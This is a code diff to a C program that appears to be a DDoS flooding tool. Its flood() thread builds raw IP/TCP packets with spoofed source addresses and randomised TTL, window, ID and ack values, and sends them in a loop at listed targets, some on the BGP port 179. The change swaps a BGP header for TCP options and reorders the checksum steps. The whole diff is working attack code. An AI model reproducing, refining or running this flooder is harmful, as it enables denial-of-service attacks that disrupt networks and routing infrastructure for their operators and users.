@@ -63,12 +63,7 @@ struct tcpOptions
 	uint8_t tsecho4;
 	*/
 };
-struct bgp_header
-{
-	uint8_t marker[16];
-	uint16_t length;
-	uint8_t type;
-};
+
 struct list *head;
 struct list *tail;
 
@@ -253,12 +248,7 @@ void setup_tcpopts_header(struct tcpOptions *opts)
 	opts->tsecho4 = 0x00;
 	*/
 }
-void setup_bgp_header(struct bgp_header *bgph)
-{
-	memset(bgph->marker, 0xff, sizeof(bgph->marker));
-	bgph->length = htons(sizeof(struct bgp_header) - 16);
-	bgph->type = 1; // Open message type
-}
+
 void *flood(void *par1)
 {
 	struct thread_data *td = (struct thread_data *)par1;
@@ -266,7 +256,7 @@ void *flood(void *par1)
 	struct iphdr *iph = (struct iphdr *)datagram;
 	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
 	struct tcpOptions *opts = (void *)iph + sizeof(struct iphdr) + sizeof(struct tcphdr);
-	struct bgp_header *bgph = (void *)iph + sizeof(struct iphdr) + sizeof(struct tcphdr);
+
 	struct sockaddr_in *sins = td->sins;
 	struct list *list_node = td->list_node;
 	struct list *bpg_list_node = td->bpg_list_node;
@@ -283,7 +273,6 @@ void *flood(void *par1)
 	setup_ip_header(iph);
 	setup_tcp_header(tcph);
 	setup_tcpopts_header(opts);
-	setup_bgp_header(bgph);
 	iph->saddr = sins[0].sin_addr.s_addr;
 	iph->daddr = list_node->data.sin_addr.s_addr;
 	iph->check = csum((unsigned short *)datagram, iph->tot_len);
@@ -307,20 +296,23 @@ void *flood(void *par1)
 		iph->check = 0;
 		int bpgOrDrd = randnum(0, 1);
 		iph->saddr = sins[sn_i].sin_addr.s_addr;
+		iph->ttl = randnum(64, 255);
+		tcph->window = htons(windows[rand_cmwc() % 4]);
+		iph->id = htonl(rand_cmwc() & 0xFFFF);
 		if (bpgOrDrd == 1)
 		{
 			tcph->res2 = 0;
-			bgph->type = randnum(1, 4);
-			setup_bgp_header(bgph);
-			tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct bgp_header)) / 4;
+			tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpOptions)) / 4;
 			tcph->dest = htons(179);
 			tcph->source = htons(179);
 			bpg_list_node = bpg_list_node->next;
 			iph->daddr = bpg_list_node->data.sin_addr.s_addr;
-			iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct bgp_header);
-			tcph->check = tcpcsum(iph, tcph, sizeof(struct bgp_header));
+			iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
+			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+			iph->check = csum((unsigned short *)datagram, iph->tot_len);
 			sendto(s, datagram, iph->tot_len, 0,
 				   (struct sockaddr *)&bpg_list_node->data, sizeof(bpg_list_node->data));
+			continue;
 		}
 		else
 		{
@@ -358,14 +350,10 @@ void *flood(void *par1)
 			iph->daddr = list_node->data.sin_addr.s_addr;
 			iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
 			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+			iph->check = csum((unsigned short *)datagram, iph->tot_len);
+			tcph->ack_seq = randnum(10000, 99999);
 			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
 		}
-
-		iph->id = htonl(rand_cmwc() & 0xFFFF);
-		iph->check = csum((unsigned short *)datagram, iph->tot_len);
-		tcph->ack_seq = randnum(10000, 99999);
-		iph->ttl = randnum(64, 255);
-		tcph->window = htons(windows[rand_cmwc() % 4]);
 
 		// printf("Source IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->saddr));
 		//  printf("Dst IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->daddr));
